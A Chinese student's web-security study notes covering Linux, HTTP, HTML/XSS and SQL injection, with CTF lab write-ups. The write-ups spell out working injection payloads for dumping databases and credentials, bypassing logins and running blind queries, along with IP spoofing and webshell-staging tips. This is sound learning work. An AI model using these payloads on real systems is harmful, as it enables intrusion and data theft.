# 第一周作业：Web 安全核心基础（Linux/HTTP/HTML）知识点总结

## 一、 Linux 操作系统基础与实战应用

Linux 是我们搭建靶场、运行工具和后续进行提权操作的核心环境。

### 1. 目录结构
*   `/var/www/html`：最常见的 Web 网站根目录（Apache/Nginx 默认）。
*   `/etc`：系统配置文件和 Web 服务配置文件存放处（如 `/etc/passwd` 存放用户信息）。
*   `/tmp`：临时目录，所有人可读写，**实战中常作为上传 Webshell 或脚本的暂存地**。
*   `/root`：超级管理员目录。

### 2. 核心命令与实战场景
*   **权限管理（提权基础）**：
    *   `chmod +x shell.sh`：赋予脚本执行权限（上传木马后必用）。
    *   `ls -l`：查看文件权限，例如 `-rwxr-xr-x` 代表 755 权限。如果发现某个可执行文件具有 `SUID` 权限（如 `rws`），往往意味着存在提权漏洞。
*   **文件查找与文本处理**：
    *   `find / -name "flag*" 2>/dev/null`：全局搜索文件，`2>/dev/null` 用于屏蔽权限不足的报错，让界面清爽。
    *   `grep "flag{" -rn /var/www/`：在 Web 目录下递归搜索包含敏感信息的文件。
    *   `cat access.log | grep "sqlmap"`：结合管道符 `|`，在日志中快速筛选攻击者的扫描记录。
*   **网络与进程**：
    *   `netstat -tulnp` 或 `ss -tulnp`：查看当前开放的端口（如 80、3306、22 端口是否对公网开放）。
    *   `ps aux`：查看运行进程，寻找可疑的反弹 Shell 进程。

## 二、 HTTP 协议与 Web 通信

HTTP 是 Web 的基石，所有的 Web 漏洞（SQLi, XSS, RCE）最终都是通过构造恶意的 HTTP 请求来实现的。

### 1. 核心概念
*   **无状态（Stateless）**：HTTP 本身不记录上一次请求的状态，因此诞生了 `Cookie` 和 `Session` 机制来维持登录状态。
*   **请求/响应模型**：客户端（浏览器）发送 Request，服务端返回 Response。

### 2. HTTP 报文结构（非常重要）
*   **请求行**：`GET /index.php?id=1 HTTP/1.1`（包含请求方法、路径、协议版本）。
*   **常见请求方法**：
    *   `GET`：参数在 URL 中可见，有长度限制。
    *   `POST`：参数在请求体中，常用于提交表单、上传文件。
    *   `HEAD`、`PUT`、`DELETE`：测试接口安全时经常用到。
*   **请求头（Headers）**：渗透测试的突破口。
    *   `Host`：指定目标域名。
    *   `User-Agent`：客户端浏览器标识（可能被用于 SQL 注入，或伪装爬虫）。
    *   `Referer`：来源页面（某些逻辑漏洞要求 Referer 必须来自特定站内页面）。
    *   `X-Forwarded-For` / `X-Real-IP`：伪造客户端真实 IP，用于绕过基于 IP 的访问控制（如只允许本地访问的后台）。
    *   `Cookie`：携带身份凭证（极易发生越权、Cookie 注入）。

### 3. HTTP 状态码（常见的）
*   `200 OK`：请求成功。
*   `301 / 302`：永久/临时重定向（常用于跳转或 SSRF 探测内网）。
*   `403 Forbidden`：禁止访问（权限不足）。
*   `404 Not Found`：资源不存在。
*   `500 Internal Server Error`：服务器内部错误（**报错注入**的温床，当代码抛出数据库报错时页面会出现 500）。

## 三、 HTML 与前端基础

HTML 是构建网页的骨架，理解 HTML 是为了后续更好地学习 XSS（跨站脚本攻击）和前端代码审计。

### 1. 基础结构与标签
*   **标签语法**：通常成对出现 `<标签名>内容</标签名>`，或者自闭合 `<标签名 />`。
*   **HTML 骨架**：`<html>`（根）、`<head>`（头部信息，如 `<title>`）、`<body>`（可见内容）。
*   **常用标签**：
    *   `<a href="url">`：超链接（**CSRF**、**任意 URL 跳转**漏洞常利用此标签）。
    *   `< img src="url">`：图片标签（可触发 `onerror` 事件，是 **XSS** 的常用载体）。
    *   `<form>`：表单，包含 `action`（提交地址）和 `method`（GET/POST）。
    *   `<input>`：输入框（`type="text"`、`type="password"`、`type="hidden"`）。隐藏字段如果包含敏感信息如价格、角色权限，容易引发**越权或逻辑漏洞**。
    *   `<script>`：JavaScript 代码标签（**XSS 攻击的核心**，如果后端没有过滤，闭合该标签就能执行任意 JS）。

### 2. 实战关联：XSS（跨站脚本）与 HTML 解析
当网站将用户的输入（如评论内容）直接拼接到 HTML 页面中输出时，如果输入了 `<script>alert(1)</script>`，浏览器会将其当作代码执行，这就是 XSS。
**防御原理**：后端应该对用户输入进行 **HTML 实体编码**（如把 `<` 转义为 `&lt;`，把 `>` 转义为 `&gt;`），这样浏览器就会把它们当作普通字符显示，而不是解析为标签。

##  SQL 注入核心知识点总结

### 1. 什么是 SQL 注入？
SQL 注入（SQL Injection）是指攻击者通过把恶意的 SQL 代码插入到 Web 表单的输入域或页面请求的查询字符串中，欺骗后端数据库服务器执行这些恶意 SQL 命令的过程。

### 2. 产生的根本原因
*   程序没有对用户输入的数据进行严格的过滤和校验。
*   程序将用户输入的字符串**直接拼接**到了 SQL 语句中执行（呼应前面学的 PHP，例如 `$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];`）。

### 3. SQL 注入的分类
*   **按数据类型分**：
    *   **数字型**：参数不需要引号包裹，直接拼接，如 `?id=1`。
    *   **字符型**：参数在数据库中被单引号 `'` 或双引号 `"` 包裹，如 `?id=1'`。
*   **按提交方式分**：GET 注入、POST 注入、Cookie 注入、HTTP 头（如 X-Forwarded-For）注入。
*   **按注入手法分**：
    *   **联合查询注入 (Union)**：利用 `UNION SELECT` 将恶意查询结果回显到页面。
    *   **报错注入**：利用数据库的报错机制，在报错信息中带回数据。
    *   **布尔盲注**：页面没有回显，但根据返回页面的“真/假”状态来判断数据。
    *   **时间盲注**：页面无回显且无状态差异，利用 `sleep()` 等函数通过页面加载时间差来判断。
    *   **堆叠注入**：利用分号 `;` 执行多条 SQL 语句（较少见，PHP 的 mysqli 通常不支持）。

### 4. 必备的数据库基础（以 MySQL 为例）
*   `information_schema`：MySQL 自带的系统库，记录了所有数据库、表、列的信息。
    *   `information_schema.tables`：存放所有表名。
    *   `information_schema.columns`：存放所有字段名。
*   `group_concat()`：将多行查询结果拼接成一行字符串，极大方便了盲注和联合查询的数据读取。

---

## 二、 解题方法详解（以联合查询为例）

联合查询（`UNION SELECT`）是最基础、最直观的注入方式。核心步骤如下：

### 第一步：判断注入点与闭合方式
*   输入 `?id=1'`，若页面报错，说明存在 SQL 注入。
*   输入 `?id=1' --+`（`--+` 是注释符，用来注释掉原 SQL 语句后面的限制，如 `LIMIT 0,1`），若页面恢复正常，说明是**单引号字符型注入**。

### 第二步：判断查询字段数（列数）
利用 `ORDER BY` 语句，猜解前端查询了几列：
*   输入 `?id=1' ORDER BY 3 --+`，正常。
*   输入 `?id=1' ORDER BY 4 --+`，报错（Unknown column '4'）。
*   **结论**：当前查询共有 **3** 列。

### 第三步：寻找回显位
利用 `UNION SELECT` 必须保证前后查询列数一致的原则：
*   输入 `?id=-1' UNION SELECT 1,2,3 --+`。（*注意：这里必须让 `id=-1` 或 `id=999`，让前面的查询结果为空，这样才能把后面的数字回显出来*）
*   **观察**：如果页面只显示了数字 `2` 和 `3`，说明第 2、3 列的内容会被输出到前端。

### 第四步：爆库、爆表、爆字段（核心利用）
利用找到的回显位，替换成数据库信息：
1.  **查库名和版本**：
    `?id=-1' UNION SELECT 1, database(), version() --+`
2.  **查表名**：
    `?id=-1' UNION SELECT 1, 2, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --+`
3.  **查字段名**（假设查到了 users 表）：
    `?id=-1' UNION SELECT 1, 2, group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --+`
4.  **获取最终数据**：
    `?id=-1' UNION SELECT 1, username, password FROM users --+`

## 解题过程

### 练习一：CTFHub - SQL注入（整数型联合查询）
**1. 信息收集与初步分析**
打开靶场页面，URL 为 `?id=1`。尝试输入 `?id=1'`，页面未报错；输入 `?id=1 and 1=1` 正常，`?id=1 and 1=2` 无数据回显。判断为**数字型注入**，且页面有回显位，适合用联合查询。

**2. 漏洞定位与可利用性验证**
- 判断列数：`?id=1 order by 2` 正常，`?id=1 order by 3` 报错。确认查询结果为 **2列**。
- 寻找显位：`?id=-1 union select 1,2`。页面成功回显 `1` 和 `2`，确认这两个位置可以输出数据。

**3. 构造 Payload / Exploit 步骤**
- 爆库名：`?id=-1 union select 1, database()`
- 爆表名：`?id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'`
- 爆字段：`?id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='flag'`
- 拿数据：`?id=-1 union select 1, flag from sqli.flag`

**4. 拿到 Flag 的过程**
构造最终 Payload `?id=-1 union select 1, flag from sqli.flag`，成功在页面回显 `ctfhub{xxxxxx_redacted}`。

**5. 常见坑与参考博客的启示**
- **我的踩坑**：一开始直接 `?id=1 union select 1,2`，页面还是只显示 id=1 的内容。
- **看了他人 WP 的启示**：去 CSDN 搜了“联合查询注入原理”的博客，看到大佬解释才明白：联合查询必须保证前后列数一致，且**前一个查询必须为空**，后面的结果才会显示。把 `id=1` 改为 `id=-1` 是破局的关键。另外，博客里提到的 `group_concat()` 函数简直是神器，比起用 `limit` 一行行猜，它能一次性把所有表名拼接到一起，极大提高了效率。

### 练习二：BUUCTF - [极客大挑战 2019]EasySQL（POST 万能密码）
**1. 信息收集与初步分析**
打开靶场是一个登录页面。随便输入账号密码提示错误。这是典型的 POST 表单，后端逻辑很可能是 `SELECT * FROM users WHERE username='$user' AND password='$pass'`。

**2. 漏洞定位与可利用性验证**
**尝试万能密码**：用户名输入 `admin' or 1=1 #`，密码随便填。
拼接进后台变为：`SELECT * FROM users WHERE username='admin' or 1=1 #' AND password='...'`。`#` 注释掉密码验证，`or 1=1` 恒真，直接绕过。

**3. 拿到 Flag 的过程**
使用 Burp Suite 拦截登录请求，将参数改为 `username=admin' or 1=1%23`，Forward 放行，成功登录并拿到 `flag{xxxxxx_redacted}`。

**4. 常见坑与参考博客的启示**
- **我的踩坑**：一开始在 POST 数据包中用 `#` 注释没成功，导致登录失败。
- **看了他人 WP 的启示**：去先知社区看了一篇关于“注释符区别”的博客。得知在 POST 请求体中，直接写 `#` 有时会被浏览器或后端截断，最稳妥的方法是写 `-- -`（注意空格）或者将 `#` 进行 URL 编码为 `%23`。这让我对 HTTP 请求的底层处理有了更深理解。

### 练习三：主动拓展实践（CTFHub - 布尔盲注）


**1. 寻找新题的动机**
在做完前两题后，我思考：如果页面既没有回显数字，也没有报错信息，连报错注入都打不了，该怎么办？于是我主动在各平台搜索“SQL注入 无回显 盲注 基础题”，找到了 CTFHub 的这道布尔盲注题进行拓展。

**2. 新题原理分析**
盲注的核心在于页面的“真/假”状态（比如 `id=1` 正常，`id=1 and 1=2` 变空页面）。虽然看不到数据库内容，但可以通过不断向数据库问问题，根据页面状态判断答案。

**3. 构造 Payload 步骤**
- **判断闭合**：`?id=1' and 1=1 --+` 正常，`?id=1' and 1=2 --+` 空，确认存在注入且为单引号闭合。
- **猜解长度**：`?id=1' and length(database())=4 --+` （假设猜出库名长度为 4）。
- **猜解字符（利用 ASCII 码）**：使用 `substr()` 截取字符，用 `ascii()` 转换，再用二分法比较。
    例如测试库名第一个字符是不是 `s` (ASCII码115)：`?id=1' and ascii(substr(database(),1,1))>100 --+` 正常，`>150` 空。最后锁定 `=115`，说明第一个字符是 `s`。
- **借助工具**：手工猜解太慢，于是我搜索并学习了如何使用 Python 编写简单脚本，或者使用 `sqlmap -u "URL" --technique=B` 自动跑出结果，最终拿到 Flag。

**4. 参考博客的启示**
看了 FreeBuf 上的一篇盲注脚本文章，我学到了利用 `if(expr1, expr2, expr3)` 函数配合 `sleep()` 进行时间盲注（`?id=1' and if(ascii(substr(database(),1,1))=115, sleep(3), 0) --+`），虽然这次没用上，但为以后的实战多储备了一种姿势。
